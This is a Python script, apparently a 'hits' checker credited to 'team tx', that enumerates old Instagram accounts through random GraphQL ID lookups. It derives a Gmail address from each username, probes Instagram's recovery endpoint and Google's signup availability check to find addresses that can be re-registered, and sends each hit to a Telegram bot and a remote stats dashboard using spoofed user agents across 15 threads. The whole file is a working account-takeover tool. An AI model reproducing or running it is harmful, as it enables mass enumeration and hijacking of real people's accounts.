print("2k13 to 2k15 hits by team tx  ")
print("owner ;peter")
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from colorama import Fore, Style, init

init(autoreset=True)

# ================= FIXED DASHBOARD SYNC LOGIC =================
def send_to_dashboard(stat_type):
    try:
        # Render Live URL for syncing stats
        url = 'https://system-override-v2.onrender.com/update_stats'
        requests.post(url, json={'type': stat_type}, timeout=2)
    except:
        pass
# =============================================================

# Arguments check (Dashboard passes ID and Token)
if len(sys.argv) > 2:
    ID = sys.argv[1]
    TOKEN = sys.argv[2]
else:
    ID = input("\033[1;36mEnter Telegram ID: ")
    TOKEN = input("\033[1;36mEnter Bot Token: ")

INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
TOKEN_FILE = 'tl.txt'
eizon_domain = '@gmail.com' 

# Colors
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
Z = '\x1b[1;31m'
P = '\x1b[1;97m'

hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0

def update_stats_terminal():
    # Terminal display update
    sysdontwrite = f"\r{C1}Hits{P1} : {hits} |{Z} Bad IG{P} : {bad_insta} | {Z}Bad Email : {bad_email} | {P}Good{Z} : {good_ig}"
    sys.stdout.write(sysdontwrite)
    sys.stdout.flush()

def check_gmail(email):
    global bad_email, hits
    try:
        email_prefix = email.split('@')[0] if '@' in email else email
        # Path check for Render
        if os.path.exists(TOKEN_FILE):
            with open(TOKEN_FILE, 'r') as f:
                token_data = f.read().splitlines()[0]
            tl, host = token_data.split('//')
            
            headers = {
                'authority': 'accounts.google.com',
                'google-accounts-xsrf': '1',
                'user-agent': generate_user_agent()
            }
            params = {'TL': tl}
            data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
            
            response = pp("https://accounts.google.com/_/signup/usernameavailability", params=params, headers=headers, data=data)
            
            if '"gf.uar",1' in response.text:
                hits += 1
                send_to_dashboard('hit') 
                update_stats_terminal()
                InfoAcc(email_prefix, "gmail.com")
            else:
                bad_email += 1
                send_to_dashboard('bad') 
                update_stats_terminal()
        else:
            # If tl.txt missing, still count as bad for dashboard sync
            bad_email += 1
            send_to_dashboard('bad')
    except:
        pass

def check(email):
    global good_ig, bad_insta
    try:
        headers = {'User-Agent': generate_user_agent(), 'Cookie': COOKIE_VALUE}
        data = {
            'signed_body': 'sign.' + json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'query': email,
                'device_id': f'android-{uuid.uuid4().hex[:16]}'
            }),
            'ig_sig_key_version': '4'
        }
        
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
        if email in response:
            good_ig += 1
            if eizon_domain in email:
                check_gmail(email)
            update_stats_terminal()
        else:
            bad_insta += 1
            send_to_dashboard('bad') 
            update_stats_terminal()
    except:
        pass

def InfoAcc(username, domain):
    info_text = f"""
━━━━━━━━━━━━━━━
🚀 HIT FOUND (2013-15)
🛰 USER: {username}
🌠 EMAIL: {username}@{domain}
💀 OWNER: Peter
━━━━━━━━━━━━━━━
"""
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except:
        pass

def eizon_python():
    while True:
        try:
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            data = {
                'lsd': lsd,
                'variables': json.dumps({'id': int(random.randrange(266028916, 1900000000)), 'render_surface': 'PROFILE'}),
                'doc_id': '25618261841150840'
            }
            headers = {'X-FB-LSD': lsd}
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                check(username + eizon_domain)
        except:
            time.sleep(2)

# Threads - Render Free Tier par 10-15 threads best hain performance ke liye
for _ in range(15):
    Thread(target=eizon_python, daemon=True).start()

while True:
    time.sleep(10)
